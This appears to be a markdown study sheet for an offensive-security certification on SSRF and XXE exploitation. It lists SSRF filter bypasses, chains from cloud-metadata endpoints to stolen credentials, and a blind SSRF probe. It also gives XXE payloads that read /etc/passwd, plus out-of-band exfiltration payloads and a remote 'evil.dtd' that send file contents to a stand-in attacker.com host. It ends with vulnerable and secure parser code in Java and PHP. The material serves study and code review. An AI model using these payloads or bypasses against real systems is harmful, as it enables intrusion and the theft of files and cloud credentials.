---
name: "SSRF & XXE Exploitation"
description: "SSRF types, bypass techniques (DNS rebinding, URL parsing confusion, IP obfuscation), cloud metadata exploitation, SSRF chaining to RCE. XXE types (in-band, error-based, blind OOB), basic and advanced payloads, DTD inclusion, and code review patterns in Java and PHP."
tags: [oswe, ssrf, xxe, xml, cloud-metadata, dns-rebinding, blind-xxe, dtd]
---

## Server-Side Request Forgery (SSRF)

### SSRF Types

| Type | Description | Difficulty |
|------|-------------|-----------|
| **Basic SSRF** | Response returned to attacker | Easy |
| **Blind SSRF** | No response, only out-of-band | Medium |
| **Semi-blind SSRF** | Error messages leak info | Medium |
| **SSRF via DNS Rebinding** | Bypass filter via TTL manipulation | Hard |

### Bypass Techniques

```python
# Bypass filter via DNS rebinding
# 1. Daftarkan domain dengan TTL 0
# 2. DNS meresolve ke IP allowed (pertama kali)
# 3. Setelah cache expire, resolve ke IP internal

# Bypass filter via URL parsing confusion
# https://expected.com@attacker.com  → goes to attacker.com
# https://evil.com#expected.com       → fragment diabaikan server
# https://evil.com/expected.com       → path, bukan host

# Bypass IP filter:
# 127.0.0.1 → 2130706433 (decimal), 0x7f000001 (hex)
# 127.0.0.1 → 0 (IPv4 0.0.0.0 alias), [::1] (IPv6 loopback)
# 127.0.0.1 → 127.1 (short form)
```

### SSRF Chaining to RCE

| Environment | Technique |
|-------------|-----------|
| AWS | SSRF → EC2 metadata → IAM credentials → S3/API access |
| GCP | SSRF → metadata → access token → cloud functions |
| Kubernetes | SSRF → kubelet API → pod exec |
| Docker | SSRF → Docker socket → container exec |
| Redis/Memcached | SSRF → gopher protocol → Redis RCE |

**AWS Metadata Endpoint**: `http://169.254.169.254/latest/meta-data/`
**GCP Metadata Endpoint**: `http://metadata.google.internal/computeMetadata/v1/`
**Azure Metadata Endpoint**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

### Blind SSRF Detection

```python
import requests

# Use Burp Collaborator or interactsh for OOB detection
TARGET = "http://target/fetch?url="
COLLABORATOR = "burpcollaborator.net"

# Blind SSRF test — if collaborator receives DNS/HTTP request, SSRF confirmed
r = requests.get(TARGET + f"http://{COLLABORATOR}/test")
```

---

## XXE & XML-Based Attacks

### XXE Types

| Type | Description |
|------|-------------|
| **In-band XXE** | Data exfiltrated in response |
| **Error-based XXE** | Error messages leak file content |
| **Blind out-of-band XXE** | No response, data via HTTP/DNS callback |
| **Blind error-based XXE** | Error messages from XXE + parameter entities |

### Basic XXE Payloads

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Directory listing (Java) -->
<!ENTITY xxe SYSTEM "file:///etc/">

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

### Blind XXE — Out-of-Band Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>
```

### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### XXE via DTD Inclusion (No External DTD)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**evil.dtd**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### XXE Code Review Patterns

**Java — Vulnerable**:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));
```

**Java — Secure**:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**PHP — Vulnerable**:
```php
$xml = simplexml_load_string($_POST['xml']);
echo $xml->data;
```

**PHP — Secure**:
```php
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($_POST['xml']);
```
